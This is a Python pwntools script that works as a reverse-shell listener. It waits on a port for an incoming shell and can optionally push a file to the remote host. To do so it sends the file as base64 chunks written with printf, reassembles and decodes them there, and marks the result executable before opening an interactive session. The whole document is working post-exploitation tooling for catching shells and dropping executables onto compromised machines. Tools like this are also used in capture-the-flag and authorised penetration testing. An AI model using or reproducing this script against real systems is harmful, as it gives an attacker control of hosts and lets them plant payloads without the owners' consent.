from pwn import *
import argparse
import base64
import os
import sys
import time

LISTEN_IP = "0.0.0.0"
PART_SIZE = 20 * 1024
SUB_SIZE = 2048
ACK = "__OK__"
TIMEOUT = 5

def draw_progress(current, total, width=40):
    percent = current / total
    filled = int(width * percent)
    bar = "#" * filled + "-" * (width - filled)
    sys.stdout.write(
        f"\r[{bar}] {int(percent * 100):3d}% ({current}/{total})"
    )
    sys.stdout.flush()

def upload_file(conn, local_file, remote_file):
    if not os.path.exists(local_file):
        log.failure("Local file not found")
        sys.exit(1)

    with open(local_file, "rb") as f:
        raw = f.read()

    b64 = base64.b64encode(raw).decode()
    parts = [b64[i:i + PART_SIZE] for i in range(0, len(b64), PART_SIZE)]
    total_parts = len(parts)

    b64_dir = f"{remote_file}.b64.d"
    merged_b64 = f"{remote_file}.b64"
    remote_dir = os.path.dirname(remote_file)

    log.info(f"File size      : {len(raw)} bytes")
    log.info(f"Base64 parts   : {total_parts}")
    log.info(f"Remote path    : {remote_file}")

    start = input(
        f"[?] Start upload from which part? (0–{total_parts - 1}) [default: 0]: "
    ).strip()
    start_part = int(start) if start else 0

    if start_part < 0 or start_part >= total_parts:
        log.failure("Start part out of range")
        sys.exit(1)

    def send(cmd):
        if isinstance(cmd, str):
            cmd = cmd.encode()
        conn.sendline(cmd)

    def send_and_wait(cmd, part_i=None, sub_j=None):
        send(cmd)
        send(f"echo {ACK}")
        try:
            conn.recvuntil(ACK.encode(), timeout=TIMEOUT)
        except:
            where = f"part {part_i}" if part_i is not None else "unknown"
            if sub_j is not None:
                where += f", sub {sub_j}"
            log.failure(f"\nUpload stalled at {where}")
            sys.exit(1)

    if remote_dir:
        send_and_wait(f"mkdir -p {remote_dir}")

    if start_part == 0:
        send_and_wait(f"rm -rf {b64_dir} {merged_b64} {remote_file}")
        send_and_wait(f"mkdir -p {b64_dir}")
    else:
        send_and_wait(f"mkdir -p {b64_dir}")

    draw_progress(start_part, total_parts)

    for i in range(start_part, total_parts):
        part = parts[i]
        part_file = f"{b64_dir}/part_{i:04d}"

        send_and_wait(f"rm -f {part_file}", part_i=i)

        for j in range(0, len(part), SUB_SIZE):
            sub = part[j:j + SUB_SIZE]
            send_and_wait(
                f"printf \"%s\" \"{sub}\" >> {part_file}",
                part_i=i,
                sub_j=j // SUB_SIZE
            )
            time.sleep(0.01)

        draw_progress(i + 1, total_parts)

    sys.stdout.write("\n")

    send_and_wait(f"cat {b64_dir}/part_* > {merged_b64}")
    send_and_wait(
        f"base64 -d {merged_b64} > {remote_file} "
        f"|| busybox base64 -d {merged_b64} > {remote_file}"
    )
    send_and_wait(f"chmod +x {remote_file}")
    send_and_wait(f"rm -rf {b64_dir} {merged_b64}")

    send_and_wait("clear || printf '\\033c'")

    log.success("Upload completed")

def main():
    parser = argparse.ArgumentParser(
        description="pwntools shell listener (optional file upload)"
    )
    parser.add_argument("-p", required=True, type=int, help="listen port")
    parser.add_argument("-f", help="local file (optional)")
    parser.add_argument("-r", help="remote file path (optional)")

    args = parser.parse_args()
    context.log_level = "info"

    if (args.f and not args.r) or (args.r and not args.f):
        log.failure("Both -f and -r must be provided together")
        sys.exit(1)

    log.info(f"Listening on {LISTEN_IP}:{args.p}")
    listener = listen(args.p, bindaddr=LISTEN_IP)

    conn = listener.wait_for_connection()
    log.success("Shell connected")

    if args.f and args.r:
        upload_file(conn, args.f, args.r)
    else:
        log.info("No upload requested, entering interactive shell")

    conn.interactive()

if __name__ == "__main__":
    main()
